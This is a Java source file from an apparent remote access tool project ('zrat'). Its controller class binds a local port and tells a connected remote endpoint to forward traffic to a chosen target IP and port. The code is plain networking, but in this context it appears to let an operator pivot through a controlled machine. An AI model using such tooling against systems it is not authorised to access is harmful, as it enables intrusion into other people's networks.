package com.zrat.client.controller;

import java.net.InetSocketAddress;
import java.util.concurrent.Executors;

import org.jboss.netty.bootstrap.ServerBootstrap;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelPipeline;
import org.jboss.netty.channel.ChannelPipelineFactory;
import org.jboss.netty.channel.Channels;
import org.jboss.netty.channel.socket.nio.NioServerSocketChannelFactory;

import com.zrat.client.nio.handler.PortForwardingHandler;
import com.zrat.client.ui.Client;
import com.zrat.client.ui.model.PortForwardingModel;
import com.zrat.transfer.model.TransferDataStruct;
public class PortForwardingServiceImpl extends BaseService implements PortForwardingService {
	private static final String COMMAND_PORTFORWARDING = "portForwarding";
	private ServerBootstrap TCPBootstrap;
	public PortForwardingServiceImpl(Channel channel) {
		super(channel);
	}

	
	
	public ServerBootstrap forward(PortForwardingModel model){
		
		TCPBootstrap = new ServerBootstrap(
                new NioServerSocketChannelFactory(
                		Executors.newCachedThreadPool(),
                        Executors.newCachedThreadPool()));
		TCPBootstrap.setPipelineFactory(new ChannelPipelineFactory() {
			@Override
			public ChannelPipeline getPipeline() throws Exception {
				return Channels.pipeline(
                        new PortForwardingHandler());
			}
		});
        TCPBootstrap.setOption("tcpNoDelay", true);
        TCPBootstrap.setOption("keepAlive", true);
        InetSocketAddress addr = new InetSocketAddress(model.getLocalPort());
        TCPBootstrap.bind(addr);
        dataStruct = new TransferDataStruct(COMMAND_PORTFORWARDING);
        String[] args = new String[]{model.getTargetIp(),model.getTargetPort()+"",model.getLocalPort()+""};
        model.setId(model.getLocalPort()+"");
        Client.addPort(model);
        dataStruct.setObject(args);
        channel.write(dataStruct);
        
        return TCPBootstrap;
        
        
	}
	
	public void stopForward(){
		if (TCPBootstrap != null){
			TCPBootstrap.releaseExternalResources();
		}
	}
	
}
